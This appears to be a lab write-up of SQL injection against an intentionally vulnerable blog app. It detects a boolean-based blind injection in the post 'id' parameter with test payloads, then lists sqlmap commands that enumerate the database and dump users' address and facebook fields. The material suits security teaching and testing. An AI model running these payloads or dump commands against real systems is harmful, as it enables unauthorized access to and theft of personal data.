# SQL injection 

# SQLi in PostURL

## 1. Detect

After watching the post and saw the parameter on the URL varies by post, should see the post can be from the database query according to `id` out.

![image](https://user-images.githubusercontent.com/63194321/133370013-a70c910b-8a60-4fbd-a680-64603899d327.png)

We will check in this location.

First, we will test by appending a quote character `'` after the parameter

![image](https://user-images.githubusercontent.com/63194321/133370885-897e59e2-d252-4d6b-a149-1edb82826ca4.png)

The return result is an error message. So there could be a blind SQLi hole here.

![image](https://user-images.githubusercontent.com/63194321/133391406-72020e06-d044-4b9a-a2c9-48aae1e99cff.png)

To be more sure, we will send a more complex payload `1 or 1=1`.

The result returns all the articles in the database. So this is definitely an `SQli vulnerability`

On the other hand, to determine which type of SQLi it is, we will need to check a few more payloads.

If we add the payload `1 AND true=true`, the website results are still normal. This is a `boolean-base blind` which is a form of `blind SQLi`.

![image](https://user-images.githubusercontent.com/63194321/133391554-96cd5a80-a965-44da-b279-c4191f8ebe10.png)

We have identified the type and location of vulnerabilities, then we will exploit them next.


## 2. Exploit 

Now we will use a tool called `SQl map` to exploit the vulnerability.

**B1.** Start Sqlmap and enter command to scan for `sqli` vulnerabilities:

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch`

![image](https://user-images.githubusercontent.com/63194321/132514620-a0461970-1a66-4020-b964-d29e07edc21d.png)

**B2.** Define a list of databases:

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch -dbs`

![image](https://user-images.githubusercontent.com/63194321/132514974-21d6fb4f-a28f-4a49-98d4-b06a6f421684.png)

**B3.** Identify the tables in the database:

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch -D public -tables`

![image](https://user-images.githubusercontent.com/63194321/132515143-ab63af90-e875-482c-a97d-260182a9fd1d.png)

**B4.**  Define columns in tables:

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch -D public -T blogapp_userprofile -columns`

![image](https://user-images.githubusercontent.com/63194321/132515937-1002ad48-2c16-45fe-a06b-573d4ab3373b.png)


**B5.** Get the address value, facebook link of users.

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch -D public -T blogapp_userprofile -C address,facebook --dump`

![image](https://user-images.githubusercontent.com/63194321/132516371-564f7d1e-d631-412c-a24e-2032a255b77e.png)
